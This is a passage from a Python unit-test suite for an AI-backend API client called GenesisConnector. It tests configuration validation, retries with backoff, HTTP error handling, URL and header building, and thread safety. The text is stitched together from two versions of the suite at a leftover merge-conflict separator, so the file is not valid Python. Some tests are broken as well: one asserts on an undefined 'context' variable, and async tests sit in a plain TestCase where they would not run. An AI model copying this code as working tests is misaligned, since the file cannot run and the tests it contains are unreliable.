        Test that exceptions raised within a GenesisConnector context manager block are propagated to the caller.
        """
        with self.assertRaises(ValueError):
            with GenesisConnector(config=self.mock_config) as connector:
                # Simulate an exception during usage
                raise ValueError("Test exception")

    def test_context_manager_cleanup(self):
        """
        Verify that exiting the GenesisConnector context manager calls the cleanup method exactly once.
        
        Ensures the `close` method is invoked upon exiting the context, confirming proper resource cleanup.
        """
        with patch.object(GenesisConnector, 'close') as mock_close:
            with GenesisConnector(config=self.mock_config) as connector:
                self.assertIsNotNone(connector)
            
            # Verify cleanup was called
            mock_close.assert_called_once()

    def test_memory_usage_with_large_datasets(self):
        """
        Test that formatting multiple large payloads does not lead to significant memory usage growth.
        
        Formats a sequence of large payloads and verifies that the connector's reference count remains stable, indicating the absence of substantial memory leaks.
        """
        import sys
        
        # Get initial memory usage
        initial_refs = sys.getrefcount(self.connector)
        
        # Process large dataset
        large_payloads = [
            {'data': list(range(1000)), 'id': i} 
            for i in range(100)
        ]
        
        for payload in large_payloads:
            try:
                formatted = self.connector.format_payload(payload)
                self.assertIsNotNone(formatted)
            except Exception:
                # Expected for some edge cases
                pass
        
        # Memory should not have excessive growth
        final_refs = sys.getrefcount(self.connector)
        self.assertLess(final_refs - initial_refs, 10)

    def test_concurrent_config_updates(self):
        """
        Test that concurrent configuration updates on the connector complete successfully without errors.
        
        Spawns multiple threads to update the connector's configuration simultaneously and verifies that all updates are processed.
        """
        import threading
        import time
        
        results = []
        
        def update_config(config_id):
            """
            Update the connector's configuration with a new API key and base URL generated from the given config ID, and record the config ID in the results list.
            
            Parameters:
                config_id (int): Identifier used to generate unique configuration values.
            """
            new_config = {
                'api_key': f'key_{config_id}',
                'base_url': f'https://api{config_id}.test.com'
            }
            self.connector.reload_config(new_config)
            results.append(config_id)
        
        # Start multiple threads updating config
        threads = [
            threading.Thread(target=update_config, args=(i,))
            for i in range(5)
        ]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # All updates should complete
        self.assertEqual(len(results), 5)

    def test_error_propagation_chain(self):
        """
        Test that exceptions raised during a request preserve the original exception chain.
        
        Simulates a nested exception when sending a request and asserts that the raised exception maintains its cause.
        """
        with patch('requests.post') as mock_post:
            mock_post.side_effect = MemoryError("Out of memory")
            
            payload = {'message': 'memory_test'}
            
            with self.assertRaises(MemoryError):
                self.connector.send_request(payload)

            
            # Verify error chain is preserved
            self.assertIsNotNone(context.exception)


class TestGenesisConnectorPerformance(unittest.TestCase):
    """
    Performance tests for GenesisConnector class.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """
        Initializes a GenesisConnector instance with a test configuration before each performance test.
        """
        self.connector = GenesisConnector(config={
            'api_key': 'test_key',
            'base_url': 'https://api.test.com'
        })

    def test_payload_formatting_performance(self):
        """
        Verifies that formatting payloads containing various datetime timezones completes successfully and produces a non-None result.
        """
        import time
        
        timezone_test_cases = [
            datetime.now(timezone.utc),  # UTC
            datetime.now(timezone(timedelta(hours=5))),  # +05:00
            datetime.now(timezone(timedelta(hours=-8))),  # -08:00
            datetime.now(),  # Naive datetime
        ]
        
        for dt in timezone_test_cases:
            with self.subTest(datetime=dt):
                payload = {'timestamp': dt, 'message': 'timezone_test'}
                
                formatted = self.connector.format_payload(payload)
                self.assertIsNotNone(formatted)


    def test_concurrent_request_performance(self):
        """
        Verifies that the connector can process 50 concurrent requests within 5 seconds, ensuring all responses are received and performance criteria are met.
        """
        import concurrent.futures
        import time
        
        def make_request(request_id):
            """
            Send a POST request using the connector with the specified request ID in the payload and return the response data.
            
            Parameters:
                request_id: The value to include as the 'id' field in the request payload.
            
            Returns:
                dict: The response data returned by the connector.
            """
            with patch('requests.post') as mock_post:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {'id': request_id}
                mock_post.return_value = mock_response
                
                return self.connector.send_request({'id': request_id})
        
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [
                executor.submit(make_request, i) 
                for i in range(50)
            ]
            results = [future.result() for future in futures]
=======
import json
import asyncio
from datetime import datetime, timedelta
import requests
from requests.exceptions import RequestException, Timeout, ConnectionError
import logging

# Import the module under test
try:
    from app.ai_backend.genesis_connector import GenesisConnector, GenesisConnectionError, GenesisTimeoutError
except ImportError:
    # Fallback import structure
    from genesis_connector import GenesisConnector, GenesisConnectionError, GenesisTimeoutError


class TestGenesisConnector(unittest.TestCase):
    """Comprehensive unit tests for GenesisConnector class."""

    def setUp(self):
        """Set up test fixtures before each test method."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    def tearDown(self):
        """Clean up after each test method."""
        # Reset any global state or close connections
        if hasattr(self.connector, 'session'):
            self.connector.session.close()

    def test_initialization_with_valid_config(self):
        """Test successful initialization with valid configuration."""
        connector = GenesisConnector(self.mock_config)
        self.assertEqual(connector.api_key, 'test_api_key_123')
        self.assertEqual(connector.base_url, 'https://api.genesis.test')
        self.assertEqual(connector.timeout, 30)
        self.assertEqual(connector.max_retries, 3)

    def test_initialization_with_missing_api_key(self):
        """Test initialization failure when API key is missing."""
        config = self.mock_config.copy()
        del config['api_key']

        with self.assertRaises(ValueError) as context:
            GenesisConnector(config)
        self.assertIn('API key is required', str(context.exception))

    def test_initialization_with_empty_api_key(self):
        """Test initialization failure when API key is empty."""
        config = self.mock_config.copy()
        config['api_key'] = ''

        with self.assertRaises(ValueError) as context:
            GenesisConnector(config)
        self.assertIn('API key cannot be empty', str(context.exception))

    def test_initialization_with_invalid_base_url(self):
        """Test initialization failure with invalid base URL."""
        config = self.mock_config.copy()
        config['base_url'] = 'invalid_url'

        with self.assertRaises(ValueError) as context:
            GenesisConnector(config)
        self.assertIn('Invalid base URL', str(context.exception))

    def test_initialization_with_negative_timeout(self):
        """Test initialization failure with negative timeout."""
        config = self.mock_config.copy()
        config['timeout'] = -1

        with self.assertRaises(ValueError) as context:
            GenesisConnector(config)
        self.assertIn('Timeout must be positive', str(context.exception))

    def test_initialization_with_zero_max_retries(self):
        """Test initialization with zero max retries."""
        config = self.mock_config.copy()
        config['max_retries'] = 0

        connector = GenesisConnector(config)
        self.assertEqual(connector.max_retries, 0)

    def test_initialization_with_negative_max_retries(self):
        """Test initialization failure with negative max retries."""
        config = self.mock_config.copy()
        config['max_retries'] = -1

        with self.assertRaises(ValueError) as context:
            GenesisConnector(config)
        self.assertIn('Max retries cannot be negative', str(context.exception))

    @patch('requests.Session.request')
    def test_make_request_success(self, mock_request):
        """Test successful API request."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'data': 'test_data'}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.make_request('GET', '/test/endpoint')

        self.assertEqual(result, {'data': 'test_data'})
        mock_request.assert_called_once_with(
            'GET',
            'https://api.genesis.test/test/endpoint',
            headers={'Authorization': 'Bearer test_api_key_123'},
            timeout=30
        )

    @patch('requests.Session.request')
    def test_make_request_with_data(self, mock_request):
        """Test API request with POST data."""
        mock_response = Mock()
        mock_response.status_code = 201
        mock_response.json.return_value = {'id': 123, 'status': 'created'}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        test_data = {'name': 'test', 'value': 42}
        result = self.connector.make_request('POST', '/create', data=test_data)

        self.assertEqual(result, {'id': 123, 'status': 'created'})
        mock_request.assert_called_once_with(
            'POST',
            'https://api.genesis.test/create',
            headers={'Authorization': 'Bearer test_api_key_123'},
            json=test_data,
            timeout=30
        )

    @patch('requests.Session.request')
    def test_make_request_with_custom_headers(self, mock_request):
        """Test API request with custom headers."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        custom_headers = {'X-Custom-Header': 'custom_value'}
        result = self.connector.make_request('GET', '/test', headers=custom_headers)

        expected_headers = {
            'Authorization': 'Bearer test_api_key_123',
            'X-Custom-Header': 'custom_value'
        }
        mock_request.assert_called_once_with(
            'GET',
            'https://api.genesis.test/test',
            headers=expected_headers,
            timeout=30
        )

    @patch('requests.Session.request')
    def test_make_request_timeout_error(self, mock_request):
        """Test request timeout handling."""
        mock_request.side_effect = Timeout("Request timed out")

        with self.assertRaises(GenesisTimeoutError) as context:
            self.connector.make_request('GET', '/test')

        self.assertIn('Request timed out', str(context.exception))

    @patch('requests.Session.request')
    def test_make_request_connection_error(self, mock_request):
        """Test connection error handling."""
        mock_request.side_effect = ConnectionError("Connection failed")

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.make_request('GET', '/test')

        self.assertIn('Connection failed', str(context.exception))

    @patch('requests.Session.request')
    def test_make_request_http_error(self, mock_request):
        """Test HTTP error response handling."""
        mock_response = Mock()
        mock_response.status_code = 404
        mock_response.raise_for_status.side_effect = requests.HTTPError("404 Not Found")
        mock_response.text = "Resource not found"
        mock_request.return_value = mock_response

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.make_request('GET', '/nonexistent')

        self.assertIn('404 Not Found', str(context.exception))

    @patch('requests.Session.request')
    def test_make_request_json_decode_error(self, mock_request):
        """Test JSON decode error handling."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.side_effect = json.JSONDecodeError("Invalid JSON", "", 0)
        mock_response.text = "Invalid JSON response"
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.make_request('GET', '/test')

        self.assertIn('Invalid JSON response', str(context.exception))

    @patch('requests.Session.request')
    def test_make_request_retry_logic(self, mock_request):
        """Test retry logic on transient failures."""
        # First two calls fail, third succeeds
        mock_response_success = Mock()
        mock_response_success.status_code = 200
        mock_response_success.json.return_value = {'success': True}
        mock_response_success.raise_for_status.return_value = None

        mock_request.side_effect = [
            ConnectionError("Connection failed"),
            Timeout("Request timed out"),
            mock_response_success
        ]

        result = self.connector.make_request('GET', '/test')

        self.assertEqual(result, {'success': True})
        self.assertEqual(mock_request.call_count, 3)

    @patch('requests.Session.request')
    def test_make_request_retry_exhausted(self, mock_request):
        """Test behavior when all retries are exhausted."""
        mock_request.side_effect = [
            ConnectionError("Connection failed"),
            ConnectionError("Connection failed"),
            ConnectionError("Connection failed"),
            ConnectionError("Connection failed")  # Max retries + 1
        ]

        with self.assertRaises(GenesisConnectionError):
            self.connector.make_request('GET', '/test')

        self.assertEqual(mock_request.call_count, 4)  # Initial + 3 retries

    @patch('requests.Session.request')
    def test_get_model_info_success(self, mock_request):
        """Test successful model info retrieval."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'id': 'model_123',
            'name': 'Test Model',
            'version': '1.0.0',
            'status': 'active'
        }
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.get_model_info('model_123')

        self.assertEqual(result['id'], 'model_123')
        self.assertEqual(result['name'], 'Test Model')
        mock_request.assert_called_once_with(
            'GET',
            'https://api.genesis.test/models/model_123',
            headers={'Authorization': 'Bearer test_api_key_123'},
            timeout=30
        )

    @patch('requests.Session.request')
    def test_get_model_info_not_found(self, mock_request):
        """Test model info retrieval when model doesn't exist."""
        mock_response = Mock()
        mock_response.status_code = 404
        mock_response.raise_for_status.side_effect = requests.HTTPError("404 Not Found")
        mock_response.text = "Model not found"
        mock_request.return_value = mock_response

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.get_model_info('nonexistent_model')

        self.assertIn('404 Not Found', str(context.exception))

    @patch('requests.Session.request')
    def test_create_generation_success(self, mock_request):
        """Test successful generation creation."""
        mock_response = Mock()
        mock_response.status_code = 201
        mock_response.json.return_value = {
            'id': 'gen_123',
            'status': 'pending',
            'created_at': '2023-01-01T00:00:00Z'
        }
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        generation_request = {
            'prompt': 'Test prompt',
            'model': 'test_model',
            'max_tokens': 100
        }

        result = self.connector.create_generation(generation_request)

        self.assertEqual(result['id'], 'gen_123')
        self.assertEqual(result['status'], 'pending')
        mock_request.assert_called_once_with(
            'POST',
            'https://api.genesis.test/generations',
            headers={'Authorization': 'Bearer test_api_key_123'},
            json=generation_request,
            timeout=30
        )

    @patch('requests.Session.request')
    def test_create_generation_invalid_request(self, mock_request):
        """Test generation creation with invalid request."""
        mock_response = Mock()
        mock_response.status_code = 400
        mock_response.raise_for_status.side_effect = requests.HTTPError("400 Bad Request")
        mock_response.text = "Invalid request parameters"
        mock_request.return_value = mock_response

        invalid_request = {'prompt': ''}  # Empty prompt

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.create_generation(invalid_request)

        self.assertIn('400 Bad Request', str(context.exception))

    @patch('requests.Session.request')
    def test_get_generation_status_success(self, mock_request):
        """Test successful generation status retrieval."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'id': 'gen_123',
            'status': 'completed',
            'result': 'Generated text response',
            'completed_at': '2023-01-01T00:01:00Z'
        }
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.get_generation_status('gen_123')

        self.assertEqual(result['id'], 'gen_123')
        self.assertEqual(result['status'], 'completed')
        self.assertEqual(result['result'], 'Generated text response')
        mock_request.assert_called_once_with(
            'GET',
            'https://api.genesis.test/generations/gen_123',
            headers={'Authorization': 'Bearer test_api_key_123'},
            timeout=30
        )

    @patch('requests.Session.request')
    def test_get_generation_status_not_found(self, mock_request):
        """Test generation status retrieval when generation doesn't exist."""
        mock_response = Mock()
        mock_response.status_code = 404
        mock_response.raise_for_status.side_effect = requests.HTTPError("404 Not Found")
        mock_response.text = "Generation not found"
        mock_request.return_value = mock_response

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.get_generation_status('nonexistent_gen')

        self.assertIn('404 Not Found', str(context.exception))

    @patch('requests.Session.request')
    def test_cancel_generation_success(self, mock_request):
        """Test successful generation cancellation."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'id': 'gen_123',
            'status': 'cancelled',
            'cancelled_at': '2023-01-01T00:00:30Z'
        }
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.cancel_generation('gen_123')

        self.assertEqual(result['status'], 'cancelled')
        mock_request.assert_called_once_with(
            'DELETE',
            'https://api.genesis.test/generations/gen_123',
            headers={'Authorization': 'Bearer test_api_key_123'},
            timeout=30
        )

    @patch('requests.Session.request')
    def test_cancel_generation_already_completed(self, mock_request):
        """Test cancellation of already completed generation."""
        mock_response = Mock()
        mock_response.status_code = 409
        mock_response.raise_for_status.side_effect = requests.HTTPError("409 Conflict")
        mock_response.text = "Generation already completed"
        mock_request.return_value = mock_response

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.cancel_generation('gen_123')

        self.assertIn('409 Conflict', str(context.exception))

    @patch('requests.Session.request')
    def test_list_models_success(self, mock_request):
        """Test successful model listing."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'models': [
                {'id': 'model_1', 'name': 'Model 1'},
                {'id': 'model_2', 'name': 'Model 2'}
            ],
            'total': 2
        }
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.list_models()

        self.assertEqual(len(result['models']), 2)
        self.assertEqual(result['total'], 2)
        mock_request.assert_called_once_with(
            'GET',
            'https://api.genesis.test/models',
            headers={'Authorization': 'Bearer test_api_key_123'},
            timeout=30
        )

    @patch('requests.Session.request')
    def test_list_models_with_filters(self, mock_request):
        """Test model listing with filters."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'models': [{'id': 'model_1', 'name': 'Model 1', 'status': 'active'}],
            'total': 1
        }
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        filters = {'status': 'active', 'limit': 10}
        result = self.connector.list_models(filters)

        self.assertEqual(len(result['models']), 1)
        mock_request.assert_called_once_with(
            'GET',
            'https://api.genesis.test/models',
            headers={'Authorization': 'Bearer test_api_key_123'},
            params=filters,
            timeout=30
        )

    @patch('requests.Session.request')
    def test_health_check_success(self, mock_request):
        """Test successful health check."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'status': 'healthy',
            'timestamp': '2023-01-01T00:00:00Z'
        }
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.health_check()

        self.assertEqual(result['status'], 'healthy')
        mock_request.assert_called_once_with(
            'GET',
            'https://api.genesis.test/health',
            headers={'Authorization': 'Bearer test_api_key_123'},
            timeout=30
        )

    @patch('requests.Session.request')
    def test_health_check_failure(self, mock_request):
        """Test health check failure."""
        mock_response = Mock()
        mock_response.status_code = 503
        mock_response.raise_for_status.side_effect = requests.HTTPError("503 Service Unavailable")
        mock_response.text = "Service temporarily unavailable"
        mock_request.return_value = mock_response

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.health_check()

        self.assertIn('503 Service Unavailable', str(context.exception))

    def test_build_url_with_endpoint(self):
        """Test URL building with endpoint."""
        url = self.connector._build_url('/test/endpoint')
        self.assertEqual(url, 'https://api.genesis.test/test/endpoint')

    def test_build_url_without_leading_slash(self):
        """Test URL building without leading slash."""
        url = self.connector._build_url('test/endpoint')
        self.assertEqual(url, 'https://api.genesis.test/test/endpoint')

    def test_build_url_with_trailing_slash_in_base(self):
        """Test URL building with trailing slash in base URL."""
        config = self.mock_config.copy()
        config['base_url'] = 'https://api.genesis.test/'
        connector = GenesisConnector(config)

        url = connector._build_url('/test/endpoint')
        self.assertEqual(url, 'https://api.genesis.test/test/endpoint')

    def test_build_headers_default(self):
        """Test default header building."""
        headers = self.connector._build_headers()
        expected = {'Authorization': 'Bearer test_api_key_123'}
        self.assertEqual(headers, expected)

    def test_build_headers_with_custom(self):
        """Test header building with custom headers."""
        custom_headers = {'X-Custom': 'value', 'Content-Type': 'application/json'}
        headers = self.connector._build_headers(custom_headers)

        expected = {
            'Authorization': 'Bearer test_api_key_123',
            'X-Custom': 'value',
            'Content-Type': 'application/json'
        }
        self.assertEqual(headers, expected)

    def test_build_headers_override_auth(self):
        """Test header building when overriding authorization."""
        custom_headers = {'Authorization': 'Bearer different_token'}
        headers = self.connector._build_headers(custom_headers)

        expected = {'Authorization': 'Bearer different_token'}
        self.assertEqual(headers, expected)

    @patch('time.sleep')
    @patch('requests.Session.request')
    def test_exponential_backoff_retry(self, mock_request, mock_sleep):
        """Test exponential backoff in retry logic."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None

        # First two calls fail, third succeeds
        mock_request.side_effect = [
            ConnectionError("Connection failed"),
            ConnectionError("Connection failed"),
            mock_response
        ]

        result = self.connector.make_request('GET', '/test')

        self.assertEqual(result, {'success': True})
        # Should have slept twice (after first and second failure)
        self.assertEqual(mock_sleep.call_count, 2)
        # Check exponential backoff: 1s, then 2s
        expected_calls = [call(1), call(2)]
        mock_sleep.assert_has_calls(expected_calls)

    def test_context_manager_usage(self):
        """Test using connector as context manager."""
        with GenesisConnector(self.mock_config) as connector:
            self.assertIsNotNone(connector)
            self.assertEqual(connector.api_key, 'test_api_key_123')

    def test_repr_method(self):
        """Test string representation of connector."""
        repr_str = repr(self.connector)
        self.assertIn('GenesisConnector', repr_str)
        self.assertIn('https://api.genesis.test', repr_str)
        # Should not include the full API key for security
        self.assertNotIn('test_api_key_123', repr_str)

    def test_str_method(self):
        """Test string conversion of connector."""
        str_repr = str(self.connector)
        self.assertIn('GenesisConnector', str_repr)
        self.assertIn('https://api.genesis.test', str_repr)


class TestGenesisConnectorAsync(unittest.TestCase):
    """Test async functionality of GenesisConnector if available."""

    def setUp(self):
        """Set up test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    @patch('aiohttp.ClientSession.request')
    async def test_async_make_request_success(self, mock_request):
        """Test successful async API request."""
        mock_response = Mock()
        mock_response.status = 200
        mock_response.json = AsyncMock(return_value={'data': 'async_data'})
        mock_response.__aenter__ = AsyncMock(return_value=mock_response)
        mock_response.__aexit__ = AsyncMock(return_value=None)
        mock_request.return_value = mock_response

        if hasattr(self.connector, 'async_make_request'):
            result = await self.connector.async_make_request('GET', '/test')
            self.assertEqual(result, {'data': 'async_data'})

    @patch('aiohttp.ClientSession.request')
    async def test_async_make_request_timeout(self, mock_request):
        """Test async request timeout handling."""
        mock_request.side_effect = asyncio.TimeoutError("Async timeout")

        if hasattr(self.connector, 'async_make_request'):
            with self.assertRaises(GenesisTimeoutError):
                await self.connector.async_make_request('GET', '/test')


class TestGenesisConnectorIntegration(unittest.TestCase):
    """Integration tests for GenesisConnector (require actual API access)."""

    def setUp(self):
        """Set up integration test fixtures."""
        # These tests should only run in integration test environments
        import os
        if not os.getenv('GENESIS_INTEGRATION_TESTS'):
            self.skipTest("Integration tests disabled")

        self.config = {
            'api_key': os.getenv('GENESIS_API_KEY'),
            'base_url': os.getenv('GENESIS_BASE_URL', 'https://api.genesis.test'),
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.config)

    def test_real_health_check(self):
        """Test health check against real API."""
        try:
            result = self.connector.health_check()
            self.assertIn('status', result)
        except GenesisConnectionError:
            self.skipTest("API not available for integration testing")

    def test_real_list_models(self):
        """Test listing models against real API."""
        try:
            result = self.connector.list_models()
            self.assertIn('models', result)
            self.assertIsInstance(result['models'], list)
        except GenesisConnectionError:
            self.skipTest("API not available for integration testing")


# Custom exception classes for testing
class AsyncMock(Mock):
    """Mock class for async operations."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    async def __call__(self, *args, **kwargs):
        return super().__call__(*args, **kwargs)


if __name__ == '__main__':
    # Configure logging for tests
    logging.basicConfig(level=logging.DEBUG)


class TestGenesisConnectorAdvanced(unittest.TestCase):
    """Advanced unit tests for GenesisConnector edge cases and performance."""

    def setUp(self):
        """Set up test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3,
            'rate_limit': 100,
            'burst_limit': 10
        }
        self.connector = GenesisConnector(self.mock_config)

    def test_initialization_with_default_values(self):
        """Test initialization with minimal configuration using defaults."""
        minimal_config = {'api_key': 'test_key'}
        connector = GenesisConnector(minimal_config)

        self.assertEqual(connector.api_key, 'test_key')
        self.assertEqual(connector.timeout, 30)  # Default timeout
        self.assertEqual(connector.max_retries, 3)  # Default max_retries

    def test_initialization_with_none_values(self):
        """Test initialization handling None values in configuration."""
        config = self.mock_config.copy()
        config['timeout'] = None
        config['max_retries'] = None

        with self.assertRaises(ValueError):
            GenesisConnector(config)

    def test_initialization_with_extreme_values(self):
        """Test initialization with extreme but valid values."""
        config = self.mock_config.copy()
        config['timeout'] = 1  # Very short timeout
        config['max_retries'] = 10  # High retry count

        connector = GenesisConnector(config)
        self.assertEqual(connector.timeout, 1)
        self.assertEqual(connector.max_retries, 10)

    def test_initialization_with_invalid_config_type(self):
        """Test initialization with invalid configuration type."""
        with self.assertRaises(TypeError):
            GenesisConnector("invalid_config")

        with self.assertRaises(TypeError):
            GenesisConnector(None)

    def test_api_key_sanitization(self):
        """Test that API key is properly sanitized in logs and representations."""
        long_api_key = 'a' * 100
        config = self.mock_config.copy()
        config['api_key'] = long_api_key

        connector = GenesisConnector(config)
        repr_str = repr(connector)

        # Should not contain the full API key
        self.assertNotIn(long_api_key, repr_str)
        # Should contain some indication of the key length or partial key
        self.assertIn('***', repr_str)

    @patch('requests.Session.request')
    def test_make_request_with_special_characters(self, mock_request):
        """Test API request with special characters in endpoint and data."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        special_endpoint = '/test/endpoint with spaces/special%chars'
        special_data = {'text': 'Hello 世界! @#$%^&*()'}

        result = self.connector.make_request('POST', special_endpoint, data=special_data)

        self.assertEqual(result, {'success': True})
        mock_request.assert_called_once()

    @patch('requests.Session.request')
    def test_make_request_with_large_payload(self, mock_request):
        """Test API request with large data payload."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        # Create a large payload
        large_data = {'content': 'A' * 10000}  # 10KB of data

        result = self.connector.make_request('POST', '/large', data=large_data)

        self.assertEqual(result, {'success': True})
        mock_request.assert_called_once()

    @patch('requests.Session.request')
    def test_make_request_with_empty_response(self, mock_request):
        """Test API request handling empty response body."""
        mock_response = Mock()
        mock_response.status_code = 204  # No Content
        mock_response.json.side_effect = json.JSONDecodeError("Empty response", "", 0)
        mock_response.text = ""
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.make_request('DELETE', '/test')

        # Should handle empty response gracefully
        self.assertIsNone(result)

    @patch('requests.Session.request')
    def test_make_request_with_malformed_json(self, mock_request):
        """Test API request with malformed JSON response."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.side_effect = json.JSONDecodeError("Malformed JSON", "", 0)
        mock_response.text = '{"incomplete": json'
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.make_request('GET', '/test')

        self.assertIn('Malformed JSON', str(context.exception))

    @patch('requests.Session.request')
    def test_make_request_with_various_http_methods(self, mock_request):
        """Test API request with various HTTP methods."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']

        for method in methods:
            with self.subTest(method=method):
                result = self.connector.make_request(method, '/test')
                self.assertEqual(result, {'success': True})

    @patch('requests.Session.request')
    def test_make_request_with_status_codes(self, mock_request):
        """Test API request handling various status codes."""
        status_codes = [200, 201, 202, 204, 400, 401, 403, 404, 500, 502, 503]

        for status_code in status_codes:
            with self.subTest(status_code=status_code):
                mock_response = Mock()
                mock_response.status_code = status_code
                mock_response.text = f"Status {status_code}"

                if status_code < 400:
                    mock_response.json.return_value = {'status': status_code}
                    mock_response.raise_for_status.return_value = None
                    mock_request.return_value = mock_response

                    result = self.connector.make_request('GET', '/test')
                    if status_code != 204:  # No Content
                        self.assertEqual(result, {'status': status_code})
                else:
                    mock_response.raise_for_status.side_effect = requests.HTTPError(f"{status_code} Error")
                    mock_request.return_value = mock_response

                    with self.assertRaises(GenesisConnectionError):
                        self.connector.make_request('GET', '/test')

    @patch('time.sleep')
    @patch('requests.Session.request')
    def test_retry_with_different_exceptions(self, mock_request, mock_sleep):
        """Test retry logic with different types of exceptions."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None

        exception_types = [
            ConnectionError("Connection error"),
            Timeout("Timeout error"),
            requests.exceptions.ChunkedEncodingError("Chunked encoding error"),
            requests.exceptions.ContentDecodingError("Content decoding error")
        ]

        for exception in exception_types:
            with self.subTest(exception=type(exception).__name__):
                mock_request.side_effect = [exception, mock_response]
                mock_sleep.reset_mock()

                result = self.connector.make_request('GET', '/test')

                self.assertEqual(result, {'success': True})
                self.assertEqual(mock_request.call_count, 2)
                mock_sleep.assert_called_once_with(1)  # First retry delay
                mock_request.reset_mock()

    @patch('requests.Session.request')
    def test_concurrent_requests(self, mock_request):
        """Test handling of concurrent requests."""
        import threading
        import time

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None

        # Add slight delay to simulate real API call
        def delayed_response(*args, **kwargs):
            time.sleep(0.01)
            return mock_response

        mock_request.side_effect = delayed_response

        results = []
        errors = []

        def make_request():
            try:
                result = self.connector.make_request('GET', '/test')
                results.append(result)
            except Exception as e:
                errors.append(e)

        # Create multiple threads
        threads = []
        for i in range(5):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()

        # Wait for all threads to complete
        for thread in threads:
            thread.join()

        # All requests should succeed
        self.assertEqual(len(results), 5)
        self.assertEqual(len(errors), 0)
        self.assertEqual(mock_request.call_count, 5)

    def test_url_building_edge_cases(self):
        """Test URL building with various edge cases."""
        test_cases = [
            ('', 'https://api.genesis.test'),
            ('/', 'https://api.genesis.test/'),
            ('//endpoint', 'https://api.genesis.test/endpoint'),
            ('/endpoint/', 'https://api.genesis.test/endpoint/'),
            ('endpoint?param=value', 'https://api.genesis.test/endpoint?param=value'),
            ('/endpoint#fragment', 'https://api.genesis.test/endpoint#fragment'),
        ]

        for endpoint, expected in test_cases:
            with self.subTest(endpoint=endpoint):
                result = self.connector._build_url(endpoint)
                self.assertEqual(result, expected)

    def test_headers_with_unicode_values(self):
        """Test header building with unicode values."""
        unicode_headers = {
            'X-Custom-Header': 'value with ünicøde',
            'X-Another-Header': '测试值'
        }

        headers = self.connector._build_headers(unicode_headers)

        self.assertIn('X-Custom-Header', headers)
        self.assertIn('X-Another-Header', headers)
        self.assertEqual(headers['X-Custom-Header'], 'value with ünicøde')
        self.assertEqual(headers['X-Another-Header'], '测试值')

    def test_context_manager_exception_handling(self):
        """Test context manager behavior during exceptions."""
        class TestException(Exception):
            pass

        try:
            with GenesisConnector(self.mock_config) as connector:
                self.assertIsNotNone(connector)
                raise TestException("Test exception")
        except TestException:
            pass  # Expected

        # Context manager should properly clean up even with exceptions

    @patch('requests.Session.request')
    def test_request_timeout_variations(self, mock_request):
